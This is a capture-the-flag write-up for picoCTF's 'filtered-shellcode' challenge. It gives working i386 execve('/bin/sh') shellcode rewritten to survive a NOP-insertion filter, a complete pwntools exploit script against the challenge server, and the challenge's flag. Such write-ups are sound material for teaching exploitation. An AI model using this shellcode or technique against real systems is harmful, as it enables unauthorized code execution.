---
date: '2025-07-14T19:34:18+09:00'
draft: false
title: 'filtered-shellcode'
cover: 
    image: img/CTF/picoctf.png
    alt: 'This is a post image'
    link_url: "https://play.picoctf.org/practice/challenge/184?category=6&difficulty=3&page=2&retired=0"
    caption: 'picoCTF'
tags: ["picoCTF","pwn"]
---


picoCTF's Binary Exploitation difficulty Hard challenges are super hard for me. 


Can't believe this problem was worth only `160` points.


We get a `32` bit `ELF`.


```
file fun: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=325e35378982f451f374c7140c5249bb1c52ab18, not stripped
```


The title of the challenge is `filtered-shellcode` so I'm pretty sure `NX` isn't enabled. 


```
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x8048000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```


Here's the decompilation of the `ELF` file in Ghidra. 


The Ghidra decompilation was a bit easier to read than IDA's decompilation.


The decompilation was really hard to read it even looked harder than `x86-64`.


```C
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 main(void)
{
  int iVar1;
  char local_3fd [1000];
  char local_15;
  uint local_14;
  undefined1 *local_10;
  
  local_10 = &stack0x00000004;
  setbuf(_stdout,(char *)0x0);
  local_14 = 0;
  local_15 = 0;
  puts("Give me code to run:");
  iVar1 = fgetc(_stdin);
  local_15 = (char)iVar1;
  for (; (local_15 != '\n' && (local_14 < 1000)); local_14 = local_14 + 1) {
    local_3fd[local_14] = local_15;
    iVar1 = fgetc(_stdin);
    local_15 = (char)iVar1;
  }
  if ((local_14 & 1) != 0) {
    local_3fd[local_14] = '\x90';
    local_14 = local_14 + 1;
  }
  execute(local_3fd,local_14);
  return 0;
}
```


The main function reads up to `1000` characters or bytes and adds `NOP ('\x90')`s to make the length even. 


```C
void execute(int param_1,int param_2)
{
  int iVar1;
  undefined4 uStack_30;
  undefined1 auStack_2c [8];
  undefined1 *local_24;
  undefined1 *local_20;
  uint local_1c;
  uint local_18;
  int local_14;
  uint local_10;
  
  uStack_30 = 0x8048502;
  if ((param_1 != 0) && (param_2 != 0)) {
    local_1c = param_2 * 2;
    iVar1 = ((local_1c + 0x10) / 0x10) * -0x10;
    local_24 = auStack_2c + iVar1;
    local_20 = auStack_2c + iVar1;
    local_14 = 0;
    for (local_10 = 0; local_10 < local_1c; local_10 = local_10 + 1) {
      if ((int)local_10 % 4 < 2) {
        auStack_2c[local_10 + iVar1] = *(undefined1 *)(param_1 + local_14);
        local_14 = local_14 + 1;
      }
      else {
        auStack_2c[local_10 + iVar1] = 0x90;
      }
    }
    auStack_2c[local_1c + iVar1] = 0xc3;
    local_18 = local_1c;
    *(undefined4 *)(auStack_2c + iVar1 + -4) = 0x80485cb;
    (*(code *)(auStack_2c + iVar1))();
    return;
  }
  /* WARNING: Subroutine does not return */
  exit(1);
}
```


The `execute` function inserts `2 NOPs` for every `2` bytes. 


I initially used shellcode from [here](https://shell-storm.org/shellcode/files/shellcode-827.html).


Here's the assembly for the shellcode I sent. 


You can view the raw-bytes of assembly [here](https://defuse.ca/online-x86-assembler.htm#disassembly).


```asm
xor eax, eax 
push eax 
push 0x68732f2f
push 0x6e69622f
mov ebx, esp 
push eax 
push ebx
mov ecx, esp 
mov al, 0xb 
int 0x80 
```


The disassembly looks like this. 


The problem with the shellcode was that it used `5` bytes to pass `/bin//sh` to `execve`.


```asm 
0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  68 2f 2f 73 68          push   0x68732f2f
8:  68 2f 62 69 6e          push   0x6e69622f
d:  89 e3                   mov    ebx,esp
f:  50                      push   eax
10: 53                      push   ebx
11: 89 e1                   mov    ecx,esp
13: b0 0b                   mov    al,0xb
15: cd 80                   int    0x80
```


Since the program inserts `2 NOPs` for every `2` bytes in the string, using an odd number of bytes to pass `/bin/sh` will mess up your shellcode. 


To send a proper shellcode to get a shell you would need to modify the shellcode above.


You need to modify your shellcode so that every `2` bytes of your shellcode is a valid instruction or a `NOP`.


We need to find the instructions that are not `2` byte instructions. 


I found `5` instructions. 


```asm
2:  50  push   eax
f:  50  push   eax
10: 53  push   ebx
```


```asm
3:  68 2f 2f 73 68          push   0x68732f2f
8:  68 2f 62 69 6e          push   0x6e69622f
```


The `push` instructions are not `2` byte instructions. 


Passing `NOP`s after each `push` instruction will certify that they are `2` bytes. 


```asm
2:  50  push   eax
0:  90  nop
f:  50  push   eax
0:  90  nop
10: 53  push   ebx
0:  90  nop
```


Passing `/bin/sh` is the hard part. 


First we'll zero-out `eax` for the syscall number, `ecx`, `edx` which are used to pass the 3rd and 4th argument.


```asm 
xor eax, eax
xor ecx, ecx 
xor edx, edx 
```


Then we'll push `eax` which stores a `0 (NULL)`.


Adding a `nop` will make it a valid `2` byte instruction.


```asm 
push eax
nop
``` 


Then we'll split `'/bin//sh'` into each character  reversed `h`,`s`,`/`,`n`,`i`,`b`,`/`. 


We'll zero out `ebx`. `ebx` is the register used to pass the first argument in function calls in `x86`.


We'll use the `bl` register to pass `h` which is `0x68`.


`ebx` now holds `0x00000068`.


We need to shift `0x00000068` so that we can pass a `32` bit data. 


We'll need to shift `0x00000068` to `0x00680000`.


To do that we'll use the `shl` instruction `16` times. 


I used `.rept` and `.endr` labels from `x86`.


```asm
.rept {num_shl}
shl ebx 
.endr 
```


We've now set up `0`,`h`.


We need pass the pointer to `'0'`,`'h'`.


```asm
push ebx 
nop
```


We'll need to do the same thing for the rest of the characters `'s'`, `'/'`, `'n'`, `'i'`, `'b'`, `'/'`. 


Here's the asm for `'s'` and `'/'`. 


I used `bh` because we need our `s` right after the NULL byte.


We'll pass the pointer again. 


```asm
mov bh, 0x73
mov bl, 0x2f 
push ebx 
nop
```


Do the same thing for `'n'`, `'i'`, `'b'`, `'/'`.


```asm 
mov bh, 0x6e
mov bl, 0x69
.rept {num_shl}
shl ebx
.endr 
mov bh, 0x62 
mov bl, 0x2f 
push ebx 
nop
mov ebx, esp 
```


Pass the syscall number for execve `(11)` and run the instruction with `int 0x80`.


```
mov al, 0xb
int 0x80 
```


Here's the full shellcode.


```python
shellcode=asm(f'''
xor eax, eax
xor ecx, ecx 
xor edx, edx 
push eax
nop 
xor ebx, ebx
mov bl,0x68
.rept {num_shl}
shl ebx 
.endr 
mov bh, 0x73
mov bl, 0x2f 
push ebx 
nop
mov bh, 0x6e
mov bl, 0x69
.rept {num_shl}
shl ebx
.endr 
mov bh, 0x62 
mov bl, 0x2f 
push ebx 
nop 
mov ebx, esp 
mov al, 0xb
int 0x80 
''')
```


Sending it to remote will get you the flag. 


Here's the complete code. 


```python
from pwn import *

context.log_level = "debug"
r = remote("mercury.picoctf.net", 37853)

num_shl = 16
shellcode = asm(
    f"""
xor eax, eax
xor ecx, ecx 
xor edx, edx 
push eax
nop 
xor ebx, ebx
mov bl,0x68
.rept {num_shl}
shl ebx 
.endr 
mov bh, 0x73
mov bl, 0x2f 
push ebx 
nop
mov bh, 0x6e
mov bl, 0x69
.rept {num_shl}
shl ebx
.endr 
mov bh, 0x62 
mov bl, 0x2f 
push ebx 
nop 
mov ebx, esp 
mov al, 0xb
int 0x80 
"""
)

r.sendline(shellcode)
r.interactive()
```


The flag is `picoCTF{th4t_w4s_fun_edd8e0b87b2038ea}`.


Not sure if it was fun. It was a very hard shellcode challenge for me. 


After getting the shell you can also check out the original C code for the challenge below . 


```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_LENGTH 1000

void execute(char *shellcode, size_t length) {
  if (!shellcode || !length) {
    exit(1);
  }
  size_t new_length = length * 2;
  char result[new_length + 1];

  int spot = 0;
  for (int i = 0; i < new_length; i++) {
    if ((i % 4) < 2) {
      result[i] = shellcode[spot++];
    } else {
      result[i] = '\x90';
    }
  }
  // result[new_length] = '\xcc';
  result[new_length] = '\xc3';

  // Execute code
  int (*code)() = (int (*)())result;
  code();
}

int main(int argc, char *argv[]) {
  setbuf(stdout, NULL);
  char buf[MAX_LENGTH];
  size_t length = 0;
  char c = '\0';

  printf("Give me code to run:\n");
  c = fgetc(stdin);
  while ((c != '\n') && (length < MAX_LENGTH)) {
    buf[length] = c;
    c = fgetc(stdin);
    length++;
  }
  if (length % 2) {
    buf[length] = '\x90';
    length++;
  }
  execute(buf, length);
  return 0;
}
```


Thanks to Professor Martin Carlisle and bernie6401 for their writeup. 


{{< youtube _yW5QTVFGl8 >}}


https://hackmd.io/@SBK6401/HJ0Yn79ih 


Probably wouldn't have solved it without their help. 